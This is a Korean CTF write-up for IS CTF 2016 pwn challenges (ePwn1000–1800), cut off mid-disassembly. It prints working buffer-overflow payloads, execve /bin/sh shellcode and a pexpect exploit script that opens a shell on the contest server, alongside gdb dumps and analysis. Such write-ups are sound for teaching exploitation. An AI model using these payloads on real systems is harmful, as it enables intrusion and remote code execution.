# IS CTF 2016 Write-up

team02 응 답없음

* ePwn1000, ePwn1200, ePwn1500, ePwn1700, ePwn1800
* mPwn2000, mPwn2300
* Misc2000, Misc2300, Misc2400, Misc2500, Misc2600, Misc2700, Misc2800, Misc3000
* Web1000, Web2000
* Bon1500, Bon1700, Bon2000, Bon2300, Bon2700

## ePwn1000

### 요약

````
ied206@TS140  ~/ISCTF
$ wget http://45.63.124.167/files/epwn1000
ied206@TS140  ~/ISCTF
$ chmod +x epwn1000
ied206@TS140  ~/ISCTF
$ python -c 'print "A"*0x20 + "\x48\xd5\xff\xff" + "\x0E\x85\x04\x08"' > payload
ied206@TS140  ~/ISCTF
$ nc 45.32.46.195 10000 < payload
Input your name : Your name is : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHֿÿ
ISCTF{Overfffffffflow!!}
````

### 풀이

분석을 위해 epwn1000 바이너리를 IDA로 열어보았다.
컴파일러 stub을 제외한 함수들은 main과 cat_flag 두 개가 존재한다.

main:

![](ePwn1000/main.bmp)

cat_flag:

![](ePwn1000/cat_flag.bmp)

cat_flag 함수가 호출되어야 flag를 볼 수 있으나, cat_flag은 main에서 호출되지 않는다.
하지만 이 바이너리는 stack canary 등이 적용되어 있지 않으므로, scanf를 사용해 BOF 공격을 할 수 있다.

````
(gdb) disas main
Dump of assembler code for function main:
   0x0804851e <+0>:	push   %ebp
   0x0804851f <+1>:	mov    %esp,%ebp
   0x08048521 <+3>:	sub    $0x20,%esp
   0x08048524 <+6>:	mov    0x804a040,%eax
   0x08048529 <+11>:	push   $0x0
   0x0804852b <+13>:	push   %eax
   0x0804852c <+14>:	call   0x80483b0 <setbuf@plt>
   0x08048531 <+19>:	add    $0x8,%esp
   0x08048534 <+22>:	mov    0x804a044,%eax
   0x08048539 <+27>:	push   $0x0
   0x0804853b <+29>:	push   %eax
   0x0804853c <+30>:	call   0x80483b0 <setbuf@plt>
   0x08048541 <+35>:	add    $0x8,%esp
   0x08048544 <+38>:	push   $0x804861d
   0x08048549 <+43>:	call   0x80483c0 <printf@plt>
   0x0804854e <+48>:	add    $0x4,%esp
   0x08048551 <+51>:	lea    -0x20(%ebp),%eax
   0x08048554 <+54>:	push   %eax
   0x08048555 <+55>:	push   $0x8048630
   0x0804855a <+60>:	call   0x80483f0 <__isoc99_scanf@plt>
   0x0804855f <+65>:	add    $0x8,%esp
   0x08048562 <+68>:	lea    -0x20(%ebp),%eax
   0x08048565 <+71>:	push   %eax
   0x08048566 <+72>:	push   $0x8048633
   0x0804856b <+77>:	call   0x80483c0 <printf@plt>
   0x08048570 <+82>:	add    $0x8,%esp
   0x08048573 <+85>:	mov    $0x0,%eax
   0x08048578 <+90>:	leave
   0x08048579 <+91>:	ret
End of assembler dump.
(gdb) disas cat_flag
Dump of assembler code for function cat_flag:
   0x0804850b <+0>:	push   %ebp
   0x0804850c <+1>:	mov    %esp,%ebp
   0x0804850e <+3>:	push   $0x8048600
   0x08048513 <+8>:	call   0x80483d0 <system@plt>
   0x08048518 <+13>:	add    $0x4,%esp
   0x0804851b <+16>:	nop
   0x0804851c <+17>:	leave
   0x0804851d <+18>:	ret
End of assembler dump.
````

이 코드에서 찾을 수 있는 지역변수는 [EBP-0x20] 하나이며, 이는 uint8_t buf[20]; 과 같은 형태를 가지고 있다. IA32의 스택 프레임에 따라, main의 return address는 buf (20B) + exEBP (4B) 다음에 존재한다. return address를 cat_flag 함수의 주소로 바꿔주면 이 함수가 실행되게 할 수 있다.

이론상으로, 다음과 같은 코드로 cat_flag를 실행할 수 있다.

````
$ python -c 'print "A"*0x24 + "\x0B\x85\x04\x08"' | ./epwn1000
````

그러나 이 경우, \x0B\x85\x04\x08 부분이 제대로 print되지 않고 있고, SegFault가 나서 실패한다.

````
Input your name : Your name is : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    6625 done                python -c 'print "A"*0x24 + "\x0B\x85\x04\x08"' |
       6626 segmentation fault  ./epwn1000
````

문제를 해결하기 위해 gdb로 stack을 살펴본 결과, \x0B\x85\x04\x08가 \x00\x85\x04\x08으로 바뀌어 들어가 있었다.

````
gdb) x/32x $esp
0xffffd548:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd558:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd568:	0x41414141	0x00850408	0x00000001	0xffffd604
0xffffd578:	0xffffd60c	0x00000000	0x00000000	0x00000000
0xffffd588:	0xf7fc5000	0xf7ffdc04	0xf7ffd000	0x00000000
0xffffd598:	0xf7fc5000	0xf7fc5000	0x00000000	0x87a82a09
0xffffd5a8:	0xbda92419	0x00000000	0x00000000	0x00000000
0xffffd5b8:	0x00000001	0x08048410	0x00000000	0xf7fedee0
````

cat_flag 내의 call 명령어는 0x0804850E에서 호출된다. 현재 \x0B가 문제를 일으키고 있으므로, 이를 \x0E로 바꾼다.

````
$ python -c 'print "A"*0x24 + "\x0E\x85\x04\x08"' | nc 45.32.46.195 10000
Input your name : Your name is : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ISCTF{Overfffffffflow!!}
````

### Answer flag

````
ISCTF{Overfffffffflow!!}
````

## ePwn1200

### 요약

````
C:\Users\akwke\Desktop\netcat-1.11>nc.exe
Cmd line: 45.32.46.195 10001
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
buf : [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
]
size : 63
Is this possible!? WOW!?
ISCTF{I know that 2147483648 is less than 0!}
````

### 풀이

ePwn1200의 주요 바이너리는 다음과 같다.

````
.text:0804854B buf             = dword ptr -109h
.text:0804854B var_9           = byte ptr –9
...
.text:080485B0                 call    _read
.text:080485B5                 add     esp, 0Ch
.text:080485B8                 lea     eax, [ebp+buf]
.text:080485BE                 push    eax
.text:080485BF                 push    offset format   ; "buf : [%s]\n"
.text:080485C4                 call    _printf
.text:080485C9                 add     esp, 8
.text:080485CC                 lea     eax, [ebp+buf]
.text:080485D2                 push    eax             ; s
.text:080485D3                 call    _strlen
.text:080485D8                 add     esp, 4
.text:080485DB                 push    eax
.text:080485DC                 push    offset aSizeD   ; "size : %d\n"
.text:080485E1                 call    _printf
.text:080485E6                 add     esp, 8
.text:080485E9                 lea     eax, [ebp+buf]
.text:080485EF                 push    eax             ; s
.text:080485F0                 call    _strlen
.text:080485F5                 add     esp, 4
.text:080485F8                 add     eax, 1
.text:080485FB                 shl     eax, 2
.text:080485FE                 mov     [ebp+var_9], al
.text:08048601                 cmp     [ebp+var_9], 0
.text:08048605                 jz      short loc_8048616
.text:08048607                 push    offset s        ; "I think there is no bug here..."
.text:0804860C                 call    _puts
.text:08048611                 add     esp, 4
.text:08048614                 jmp     short loc_8048630
.text:08048616 ; ---------------------------------------------------------------------------
.text:08048616
.text:08048616 loc_8048616:                            ; CODE XREF: main+BAj
.text:08048616                 push    offset aIsThisPossible ; "Is this possible!? WOW!?"
.text:0804861B                 call    _puts
.text:08048620                 add     esp, 4
.text:08048623                 push    offset command  ; "/bin/cat /home/epwn1200/flag"
.text:08048628                 call    _system
.text:0804862D                 add     esp, 4
````

주목해야하는 점은, AL이 0만 되면, Flag가 출력된다는 것이다.

1. EAX에 입력 문자열의 길이 + 1 ( Enter ) 이 저장된다. 그리고 size : %d의 인자는 eax이므로 eax의 값이 출력된다.
2. AL = Low 8bit이므로 이를 0으로 만들기 위해선 ( 입력 문자열 길이 + Enter + 1 ) * 4가 256의 배수면 된다.
3. Buf의 크기는 100h ( 256 )이므로 62, 126, 254개의 문자로 이루어진 문자열이 저장가능하다.

그래서 다음과 같이 a를 62개, 126개, 254개 집어 넣으면 Flag값이 출력된다.

````
C:\Users\akwke\Desktop\netcat-1.11>nc.exe
Cmd line: 45.32.46.195 10001
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
buf : [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
]
size : 63
Is this possible!? WOW!?
ISCTF{I know that 2147483648 is less than 0!}
````

````
C:\Users\akwke\Desktop\netcat-1.11>nc.exe
Cmd line: 45.32.46.195 10001
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
buf : [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
]
size : 127
Is this possible!? WOW!?
ISCTF{I know that 2147483648 is less than 0!}
````

````
C:\Users\akwke\Desktop\netcat-1.11>nc.exe
Cmd line: 45.32.46.195 10001
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
buf : [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
]
size : 255
Is this possible!? WOW!?
ISCTF{I know that 2147483648 is less than 0!}
````

### Answer flag

````
ISCTF{I know that 2147483648 is less than 0!}
````

## ePwn1500

### 요약

````
ied206@TS140  ~/ISCTF/epwn1500
$ wget http://45.63.124.167/files/epwn1500
ied206@TS140  ~/ISCTF/epwn1500
$ chmod +x epwn1500
ied206@TS140  ~/ISCTF/epwn1500
$ python -c 'print "A"*264 + "\x49\x86\x04\x08"' | nc 45.32.46.195 10002
Input the admin password : Your input is : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI
You are not admin... :P
ISCTF{I like f0rmat-str1ng bug. :P}
````

### 풀이

epwn1500 바이너리 내에서 컴파일러 stub을 제외하면, main 함수만이 존재한다.

Main 내의 코드는 다음과 같다.

````
(gdb) disas main
Dump of assembler code for function main:
   0x080485ab <+0>:	push   %ebp
   0x080485ac <+1>:	mov    %esp,%ebp
   0x080485ae <+3>:	push   %edi
   0x080485af <+4>:	sub    $0x100,%esp
   0x080485b5 <+10>:	mov    0x804a040,%eax
   0x080485ba <+15>:	push   $0x0
   0x080485bc <+17>:	push   %eax
   0x080485bd <+18>:	call   0x8048420 <setbuf@plt>
   0x080485c2 <+23>:	add    $0x8,%esp
   0x080485c5 <+26>:	mov    0x804a044,%eax
   0x080485ca <+31>:	push   $0x0
   0x080485cc <+33>:	push   %eax
   0x080485cd <+34>:	call   0x8048420 <setbuf@plt>
   0x080485d2 <+39>:	add    $0x8,%esp
   0x080485d5 <+42>:	lea    -0x104(%ebp),%edx
   0x080485db <+48>:	mov    $0x0,%eax
   0x080485e0 <+53>:	mov    $0x40,%ecx
   0x080485e5 <+58>:	mov    %edx,%edi
   0x080485e7 <+60>:	rep stos %eax,%es:(%edi)
   0x080485e9 <+62>:	push   $0x8048739
   0x080485ee <+67>:	call   0x8048440 <printf@plt>
   0x080485f3 <+72>:	add    $0x4,%esp
   0x080485f6 <+75>:	lea    -0x104(%ebp),%eax
   0x080485fc <+81>:	push   %eax
   0x080485fd <+82>:	push   $0x8048755
   0x08048602 <+87>:	call   0x8048490 <__isoc99_scanf@plt>
   0x08048607 <+92>:	add    $0x8,%esp
   0x0804860a <+95>:	push   $0x8048758
   0x0804860f <+100>:	call   0x8048440 <printf@plt>
   0x08048614 <+105>:	add    $0x4,%esp
   0x08048617 <+108>:	lea    -0x104(%ebp),%eax
   0x0804861d <+114>:	push   %eax
   0x0804861e <+115>:	call   0x8048440 <printf@plt>
   0x08048623 <+120>:	add    $0x4,%esp
   0x08048626 <+123>:	push   $0xa
   0x08048628 <+125>:	call   0x8048480 <putchar@plt>
   0x0804862d <+130>:	add    $0x4,%esp
   0x08048630 <+133>:	mov    0x804a034,%eax
   0x08048635 <+138>:	lea    -0x104(%ebp),%edx
   0x0804863b <+144>:	push   %edx
   0x0804863c <+145>:	push   %eax
   0x0804863d <+146>:	call   0x8048430 <strcmp@plt>
   0x08048642 <+151>:	add    $0x8,%esp
   0x08048645 <+154>:	test   %eax,%eax
   0x08048647 <+156>:	jne    0x8048658 <main+173>
   0x08048649 <+158>:	push   $0x8048769
   0x0804864e <+163>:	call   0x8048460 <system@plt>
   0x08048653 <+168>:	add    $0x4,%esp
   0x08048656 <+171>:	jmp    0x8048665 <main+186>
   0x08048658 <+173>:	push   $0x8048786
   0x0804865d <+178>:	call   0x8048450 <puts@plt>
   0x08048662 <+183>:	add    $0x4,%esp
   0x08048665 <+186>:	mov    $0x0,%eax
   0x0804866a <+191>:	mov    -0x4(%ebp),%edi
   0x0804866d <+194>:	leave
   0x0804866e <+195>:	ret
End of assembler dump.
````

main의 stack frame은 다음과 같다.

````
uint8_t buf[0x100];
int32_t var;
before-main EBP
return address
````

이 문제를 풀기 위해선 flag가 존재하는 0x0804a034의 값을 읽거나, `system("/bin/cat /home/epwn1500/flag");`가 존재하는 0x08048649로 EIP를 이동시켜야 한다. 본 풀이에서는 후자의 방법을 택하였다.

main 내에 별도의 stack canary가 존재하지 않기 때문에 scanf를 사용한 BOF가 가능하다.
payload는 256 + 4 + 4바이트의 더미 데이터 + Return Address로 구성하면 된다.

````
ied206@TS140  ~/ISCTF/epwn1500
$ python -c 'print "A"*264 + "\x49\x86\x04\x08"' | nc 45.32.46.195 10002
Input the admin password : Your input is : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI
You are not admin... :P
ISCTF{I like f0rmat-str1ng bug. :P}
````

### Answer flag

````
ISCTF{I like f0rmat-str1ng bug. :P}
````

## ePwn1700

### 요약

````
ied206@TS140  ~/ISCTF/epwn1700
$ wget http://45.63.124.167/files/epwn1700
ied206@TS140  ~/ISCTF/epwn1700
$ chmod +x epwn1700
ied206@TS140  ~/ISCTF/epwn1700
$ vim expect.py
ied206@TS140  ~/ISCTF/epwn1700
$ cat expect.py
#!/usr/bin/env python3
import pexpect
import sys
p = pexpect.spawn(sys.argv[1])
opts = [ "Buffer overflow detector v0.1 !!! \r\nBuffer address at : 0x([a-fA-F0-9]+)\r\n",
          pexpect.EOF ]
while True:
    index = p.expect(opts, timeout=3)
    if index == 0:
        address = int(p.match.group(1), 16).to_bytes(4, byteorder='little')
        shellcode = b'\x90'*36 +  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + b'\xDE\xAD\xBE\xEF'*2 + b'\x00\xe1\xd7\xFF'
        shellcode = shellcode + address
        print(shellcode)
        p.send(shellcode)
        p.interact()

ied206@TS140  ~/ISCTF/epwn1700
$ ./expect.py 'nc 45.32.46.195 10003'
b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9090\x90\x90\x901\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\xc0@\xcd\x80\xde\xad\xbe\xef\xde\x\xa0%\xbf\xff'
1󿿐h//shh/bin㊁°^K̀1󿿀̀ޭ¾𐞭¾☿ %¿ÿ
1󿿐h//shh/bin㊁°
               ̀1󿿀̀ޭ¾𐞭¾
cat /home/epwn1700/flag
ISCTF{0xdaedbeefdaedbeef!!}
````

epwn1700 바이너리 내에서 컴파일러 stub을 제외하면, main 함수만이 존재한다.

Main 내의 코드는 다음과 같다.

````
(gdb) disas main
Dump of assembler code for function main:
   0x0804854b <+0>:	push   %ebp
   0x0804854c <+1>:	mov    %esp,%ebp
   0x0804854e <+3>:	sub    $0x48,%esp
   0x08048551 <+6>:	mov    0x804a040,%eax
   0x08048556 <+11>:	push   $0x0
   0x08048558 <+13>:	push   %eax
   0x08048559 <+14>:	call   0x80483d0 <setbuf@plt>
   0x0804855e <+19>:	add    $0x8,%esp
   0x08048561 <+22>:	mov    0x804a044,%eax
   0x08048566 <+27>:	push   $0x0
   0x08048568 <+29>:	push   %eax
   0x08048569 <+30>:	call   0x80483d0 <setbuf@plt>
   0x0804856e <+35>:	add    $0x8,%esp
   0x08048571 <+38>:	push   $0x804869c
   0x08048576 <+43>:	call   0x8048410 <puts@plt>
   0x0804857b <+48>:	add    $0x4,%esp
   0x0804857e <+51>:	movl   $0x0,-0x8(%ebp)
   0x08048585 <+58>:	movl   $0x0,-0x4(%ebp)
   0x0804858c <+65>:	mov    0x8048690,%eax
   0x08048591 <+70>:	mov    0x8048694,%edx
   0x08048597 <+76>:	mov    %eax,-0x8(%ebp)
   0x0804859a <+79>:	mov    %edx,-0x4(%ebp)
   0x0804859d <+82>:	push   $0x40
   0x0804859f <+84>:	push   $0x0
   0x080485a1 <+86>:	lea    -0x48(%ebp),%eax
   0x080485a4 <+89>:	push   %eax
   0x080485a5 <+90>:	call   0x8048430 <memset@plt>
   0x080485aa <+95>:	add    $0xc,%esp
   0x080485ad <+98>:	lea    -0x48(%ebp),%eax
   0x080485b0 <+101>:	push   %eax
   0x080485b1 <+102>:	push   $0x80486bf
   0x080485b6 <+107>:	call   0x8048400 <printf@plt>
   0x080485bb <+112>:	add    $0x8,%esp
   0x080485be <+115>:	push   $0x100
   0x080485c3 <+120>:	lea    -0x48(%ebp),%eax
   0x080485c6 <+123>:	push   %eax
   0x080485c7 <+124>:	push   $0x0
   0x080485c9 <+126>:	call   0x80483f0 <read@plt>
   0x080485ce <+131>:	add    $0xc,%esp
   0x080485d1 <+134>:	lea    -0x8(%ebp),%eax
   0x080485d4 <+137>:	push   %eax
   0x080485d5 <+138>:	push   $0x8048690
   0x080485da <+143>:	call   0x80483e0 <strcmp@plt>
   0x080485df <+148>:	add    $0x8,%esp
   0x080485e2 <+151>:	test   %eax,%eax
   0x080485e4 <+153>:	je     0x80485fa <main+175>
   0x080485e6 <+155>:	push   $0x80486d8
   0x080485eb <+160>:	call   0x8048410 <puts@plt>
   0x080485f0 <+165>:	add    $0x4,%esp
   0x080485f3 <+168>:	mov    $0xffffffff,%eax
   0x080485f8 <+173>:	jmp    0x804860b <main+192>
   0x080485fa <+175>:	lea    -0x48(%ebp),%eax
   0x080485fd <+178>:	push   %eax
   0x080485fe <+179>:	call   0x8048410 <puts@plt>
   0x08048603 <+184>:	add    $0x4,%esp
   0x08048606 <+187>:	mov    $0x0,%eax
   0x0804860b <+192>:	leave
   0x0804860c <+193>:	ret
End of assembler dump.
````

main 내에는 총 2개의 배열이 존재한다.
````
uint8_t buf[0x40];
uint8_t cookie_cmp[0x08];
````

buf에 넣을 값을 읽을 때, read는 셋째 인자로 0x100을 받고 있으므로 BOF가 가능하다.
cookie_cmp 값은 main이 끝나기 전에 strcmp로 검사를 받는, 일종의 스택 카나리 역할을 한다. 다만 epwn1700은 stack canary의 값이 0xDEADBEEFDEADBEEF로 동일하기에 이를 우회할 수 있다.

buf + cookie_cmp + exEBP + return address 순으로 main의 스택 프레임이 구성되어 있으므로, buf의 64B 내에 쉘코드를 넣고, cookie_cmp는 stack canary 검사를 우회하기 위해 0xDEADBEEFDEADBEEF로 넣는다. 이 때 stack canary 검사가 memcmp가 아닌 strcmp로 이루어지기에, exEBP 자리에 들어갈 4B 주소는 하위 8비트가 0으로 설정되어 있어야 한다 (즉 NULL로 읽혀져야 한다). 이후,  return address는 buf의 시작 주소를 주면 된다.

이 때 buf의 시작 주소는 매번 변하는 문제가 있으나, epwn1700은 buf의 주소를 stdout에 출력해준다. 따라서 이 문제를 풀기 위해선 이 값을 읽은 뒤 동적으로 쉘코드에 주소를 삽입하여 stdin에 넣어줘야 한다. 이를 위해 python의 pexpect 모듈을 사용한다.

먼저, /bin/sh을 호출하는 28B 쉘코드를 준비한다.

````
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
````

NOP Sled의 효과를 내고, 64B에 맞춰 패딩을 하기 위해 앞에 36B의 NOP을 붙인다. cookie_cmp 검사를 대비해 뒤에 0xDEADBEEFDEADBEEF를 추가한 후, exEBP 자리에 들어갈 하위 1B가 0인 더미주소 4바이트도 붙인다.

````
#!/usr/bin/env python3
shellcode = b'\x90'*36 +  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + b'\xDE\xAD\xBE\xEF'*2 + b'\x00\xe1\xd7\xFF'
````

stdout에서 출력해주는 buf의 주소를 읽은 뒤, 이를 쉘코드 맨 뒤에 붙인다.

````
#!/usr/bin/env python3
# buf’s address captured in p.match.group(1)
address = int(p.match.group(1), 16).to_bytes(4, byteorder='little')
shellcode = shellcode + address
````

epwn1700의 stdin과 stdout을 통제하기 위해 python의 pexpect 모듈을 사용한다.
출력된 buf의 주소를 찾은 뒤 쉘코드를 생성하고, 이후부터는 stdin과 stdout을 정상적인 상태처럼 쉘로 보내 /bin/sh을 내가 조작할 수 있도록 한다.
문제풀이에 사용한 코드는 다음과 같다.

````
ied206@TS140  ~/ISCTF/mpwn2000
$ cat expect.py
#!/usr/bin/env python3

import pexpect
import sys

p = pexpect.spawn(sys.argv[1])

opts = [ "Buffer overflow detector v0.1 !!! \r\nBuffer address at : 0x([a-fA-F0-9]+)\r\n",
          pexpect.EOF ]

while True:
    index = p.expect(opts, timeout=3)
    if index == 0:
        address = int(p.match.group(1), 16).to_bytes(4, byteorder='little')
        shellcode = b'\x90'*36 +

b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + b'\xDE\xAD\xBE\xEF'*2 + b'\x00\xe1\xd7\xFF'
        shellcode = shellcode + address
        print(shellcode)
        p.send(shellcode)
        p.interact()
````

이를 실행하면 다음 결과를 얻을 수 있다.

````
ied206@TS140  ~/ISCTF/epwn1700
$ ./expect.py 'nc 45.32.46.195 10003'
b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9090\x90\x90\x901\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\xc0@\xcd\x80\xde\xad\xbe\xef\xde\x\xa0%\xbf\xff'
1󿿐h//shh/bin㊁°^K̀1󿿀̀ޭ¾𐞭¾☿ %¿ÿ
1󿿐h//shh/bin㊁°
               ̀1󿿀̀ޭ¾𐞭¾
cat /home/epwn1700/flag
ISCTF{0xdaedbeefdaedbeef!!}
````

### Answer flag

````
ISCTF{0xdaedbeefdaedbeef!!}
````

## ePwn1800

### 요약

````
ied206@TS140  ~/ISCTF/epwn1800
$ wget http://45.63.124.167/files/epwn1800
ied206@TS140  ~/ISCTF/epwn1800
$ chmod +x epwn1800
ied206@TS140  ~/ISCTF/epwn1800
$ python -c "print '-1 ' + 'A'*253" | nc 45.32.46.195 10004
Input the password length : Input the password (length : 255
Congratz !
The flag is ISCTF{I don't need to match them :)}
````

### 풀이

epwn1800 바이너리 내에서 컴파일러 stub을 제외하면, main 함수만이 존재한다.

Main 내의 코드는 다음과 같다.

````
(gdb) disas main
Dump of assembler code for function main:
   0x080486db <+0>:	lea    0x4(%esp),%ecx
   0x080486df <+4>:	and    $0xfffffff0,%esp
   0x080486e2 <+7>:	pushl  -0x4(%ecx)
   0x080486e5 <+10>:	push   %ebp
   0x080486e6 <+11>:	mov    %esp,%ebp
   0x080486e8 <+13>:	push   %edi
   0x080486e9 <+14>:	push   %ebx
   0x080486ea <+15>:	push   %ecx
   0x080486eb <+16>:	sub    $0x12c,%esp
   0x080486f1 <+22>:	mov    %gs:0x14,%eax
   0x080486f7 <+28>:	mov    %eax,-0x1c(%ebp)
   0x080486fa <+31>:	xor    %eax,%eax
   0x080486fc <+33>:	mov    0x804a060,%eax
   0x08048701 <+38>:	sub    $0x8,%esp
   0x08048704 <+41>:	push   $0x0
   0x08048706 <+43>:	push   %eax
   0x08048707 <+44>:	call   0x8048500 <setbuf@plt>
   0x0804870c <+49>:	add    $0x10,%esp
   0x0804870f <+52>:	mov    0x804a064,%eax
   0x08048714 <+57>:	sub    $0x8,%esp
   0x08048717 <+60>:	push   $0x0
   0x08048719 <+62>:	push   %eax
   0x0804871a <+63>:	call   0x8048500 <setbuf@plt>
   0x0804871f <+68>:	add    $0x10,%esp
   0x08048722 <+71>:	lea    -0x11c(%ebp),%edx
   0x08048728 <+77>:	mov    $0x0,%eax
   0x0804872d <+82>:	mov    $0x40,%ecx
   0x08048732 <+87>:	mov    %edx,%edi
   0x08048734 <+89>:	rep stos %eax,%es:(%edi)
   0x08048736 <+91>:	movl   $0x0,-0x128(%ebp)
   0x08048740 <+101>:	sub    $0x8,%esp
   0x08048743 <+104>:	push   $0x8048a00
   0x08048748 <+109>:	push   $0x8048a02
   0x0804874d <+114>:	call   0x80485a0 <fopen@plt>
   0x08048752 <+119>:	add    $0x10,%esp
   0x08048755 <+122>:	mov    %eax,-0x128(%ebp)
   0x0804875b <+128>:	cmpl   $0x0,-0x128(%ebp)
   0x08048762 <+135>:	jne    0x804876e <main+147>
   0x08048764 <+137>:	mov    $0xffffffff,%eax
   0x08048769 <+142>:	jmp    0x804895f <main+644>
   0x0804876e <+147>:	sub    $0x4,%esp
   0x08048771 <+150>:	pushl  -0x128(%ebp)
   0x08048777 <+156>:	push   $0x100
   0x0804877c <+161>:	lea    -0x11c(%ebp),%eax
   0x08048782 <+167>:	push   %eax
   0x08048783 <+168>:	call   0x8048530 <fgets@plt>
   0x08048788 <+173>:	add    $0x10,%esp
=> 0x0804878b <+176>:	sub    $0xc,%esp
   0x0804878e <+179>:	pushl  -0x128(%ebp)
   0x08048794 <+185>:	call   0x8048540 <fclose@plt>
   0x08048799 <+190>:	add    $0x10,%esp
   0x0804879c <+193>:	sub    $0xc,%esp
   0x0804879f <+196>:	push   $0x8048a16
   0x080487a4 <+201>:	call   0x8048510 <printf@plt>
   0x080487a9 <+206>:	add    $0x10,%esp
   0x080487ac <+209>:	sub    $0x8,%esp
   0x080487af <+212>:	lea    -0x131(%ebp),%eax
   0x080487b5 <+218>:	push   %eax
   0x080487b6 <+219>:	push   $0x8048a33
   0x080487bb <+224>:	call   0x80485c0 <__isoc99_scanf@plt>
   0x080487c0 <+229>:	add    $0x10,%esp
   0x080487c3 <+232>:	mov    0x804a060,%eax
   0x080487c8 <+237>:	sub    $0xc,%esp
   0x080487cb <+240>:	push   %eax
   0x080487cc <+241>:	call   0x8048520 <fflush@plt>
   0x080487d1 <+246>:	add    $0x10,%esp
   0x080487d4 <+249>:	movzbl -0x131(%ebp),%eax
   0x080487db <+256>:	test   %al,%al
   0x080487dd <+258>:	jne    0x80487f9 <main+286>
   0x080487df <+260>:	sub    $0xc,%esp
   0x080487e2 <+263>:	push   $0x8048a36
   0x080487e7 <+268>:	call   0x8048510 <printf@plt>
   0x080487ec <+273>:	add    $0x10,%esp
   0x080487ef <+276>:	mov    $0x1,%eax
   0x080487f4 <+281>:	jmp    0x804895f <main+644>
   0x080487f9 <+286>:	movzbl -0x131(%ebp),%eax
   0x08048800 <+293>:	movzbl %al,%eax
   0x08048803 <+296>:	add    $0x1,%eax
   0x08048806 <+299>:	sub    $0xc,%esp
   0x08048809 <+302>:	push   %eax
   0x0804880a <+303>:	call   0x8048560 <malloc@plt>
   0x0804880f <+308>:	add    $0x10,%esp
   0x08048812 <+311>:	mov    %eax,-0x124(%ebp)
   0x08048818 <+317>:	movzbl -0x131(%ebp),%eax
   0x0804881f <+324>:	movzbl %al,%eax
   0x08048822 <+327>:	sub    $0x8,%esp
   0x08048825 <+330>:	push   %eax
